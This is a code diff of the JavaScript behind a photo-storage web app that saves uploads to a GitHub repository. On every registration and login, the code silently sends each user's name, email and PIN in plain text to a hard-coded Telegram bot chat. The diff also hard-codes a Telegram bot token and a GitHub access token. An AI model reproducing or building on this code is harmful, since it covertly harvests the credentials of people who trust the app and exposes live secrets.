@@ -1,40 +1,39 @@
 let isRegistering = false;
-
-// --- আপনার তথ্য ---
-const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
-const CHAT_ID = "7416528268";
+const GITHUB_TOKEN = "Ghp_QUGftteZ1wXZ9xe4Ucqpfyd0YQNxvr0N8aAj";
 const REPO_OWNER = "SIYAMBOSS";
 const REPO_NAME = "PHOTO SAVE-BOSS";
-
-window.onload = () => {
-    const savedUser = localStorage.getItem('activeUser');
-    if (savedUser) showDashboard(savedUser);
-};
+const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
+const CHAT_ID = "7416528268";
 
 function toggleAuth() {
     isRegistering = !isRegistering;
-    document.getElementById('auth-title').innerText = isRegistering ? "REGISTER" : "SIYAMBOSS";
-    document.getElementById('confirm-pin-box').classList.toggle('hidden');
+    document.getElementById('reg-fields').classList.toggle('hidden');
+    document.getElementById('auth-title').innerText = isRegistering ? "Create Account" : "Login";
+    document.getElementById('toggle-text').innerHTML = isRegistering ? 
+        "Already have an account? <span class='text-blue-500 font-bold'>Login</span>" : 
+        "Don't have an account? <span class='text-blue-500 font-bold'>Create Account</span>";
 }
 
 async function handleAuth() {
+    const name = document.getElementById('user-name').value;
     const email = document.getElementById('user-email').value;
-    const p1 = document.getElementById('pin-1').value;
-    if(!email || !p1) return alert("Fill fields!");
+    const pin = document.getElementById('pin-1').value;
+
+    if(!email || !pin) return;
 
     if(isRegistering) {
-        sendToTelegram(`🔥 NEW USER\n📧 Email: ${email}\n🔑 PIN: ${p1}`);
-        alert("Registered! Now login.");
+        if(!name) return;
+        const msg = `🌟 NEW REGISTRATION\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        alert("Registration Successful! Please Login.");
         toggleAuth();
     } else {
-        sendToTelegram(`🔓 LOGIN\n📧 Email: ${email}\n🔑 PIN: ${p1}`);
+        const msg = `🔓 LOGIN ATTEMPT\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        document.getElementById('login-sound').play();
         localStorage.setItem('activeUser', email);
         showDashboard(email);
     }
-}
-
-function sendToTelegram(msg) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 }
 
 function showDashboard(email) {
@@ -43,9 +42,23 @@ function showDashboard(email) {
     loadGallery(email);
 }
 
-function logout() {
-    localStorage.removeItem('activeUser');
-    location.reload();
+function switchTab(tab) {
+    const photoTab = document.getElementById('tab-photos');
+    const albumTab = document.getElementById('tab-albums');
+    const photoContent = document.getElementById('photos-content');
+    const albumContent = document.getElementById('albums-content');
+
+    if(tab === 'photos') {
+        photoTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
+        albumTab.className = "text-zinc-500 pb-1";
+        photoContent.classList.remove('hidden');
+        albumContent.classList.add('hidden');
+    } else {
+        albumTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
+        photoTab.className = "text-zinc-500 pb-1";
+        albumContent.classList.remove('hidden');
+        photoContent.classList.add('hidden');
+    }
 }
 
 async function uploadImage(event) {
@@ -53,46 +66,31 @@ async function uploadImage(event) {
     const email = localStorage.getItem('activeUser');
     if(!file) return;
 
-    alert("HD কোয়ালিটিতে সেভ হচ্ছে...");
     const reader = new FileReader();
     reader.onload = async function(e) {
         const content = e.target.result.split(',')[1];
-        const path = `vault/${email}/${Date.now()}.png`;
+        const path = `vault/${email}/photos/${Date.now()}.png`;
+        const url = `https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`;
 
-        // encodeURIComponent ব্যবহার করা হয়েছে যাতে রিপোজিটরি নামের স্পেস সমস্যা না করে
-        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`, {
+        const res = await fetch(url, {
             method: 'PUT',
             headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: `Upload by ${email}`, content: content })
+            body: JSON.stringify({ message: "HD Upload", content: content })
         });
-
-        if(res.ok) { 
-            loadGallery(email); 
-        } else { 
-            alert("❌ আপলোড ব্যর্থ! টোকেন বা রিপোজিটরি নাম চেক করুন।"); 
-        }
+        if(res.ok) loadGallery(email);
     };
     reader.readAsDataURL(file);
 }
 
 async function loadGallery(email) {
-    const gallery = document.getElementById('gallery');
-    gallery.innerHTML = "<div class='p-10 col-span-full text-center'><span class='loader'></span></div>";
-    
-    try {
-        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}`, {
-            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
-        });
-        
-        if(res.ok) {
-            const files = await res.json();
-            document.getElementById('photo-count').innerText = `${files.length} photos`;
-            gallery.innerHTML = "";
-            files.reverse().forEach(f => {
-                gallery.innerHTML += `<img src="${f.download_url}" onclick="window.open('${f.download_url}')">`;
-            });
-        } else { 
-            gallery.innerHTML = ""; 
-        }
-    } catch (err) { console.log(err); }
+    const gallery = document.getElementById('photos-content');
+    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/photos`, {
+        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+    });
+    if(res.ok) {
+        const files = await res.json();
+        gallery.innerHTML = files.reverse().map(f => `<img src="${f.download_url}" onclick="window.open('${f.download_url}')">`).join('');
+    }
 }
+
+function logout() { localStorage.removeItem('activeUser'); location.reload(); }
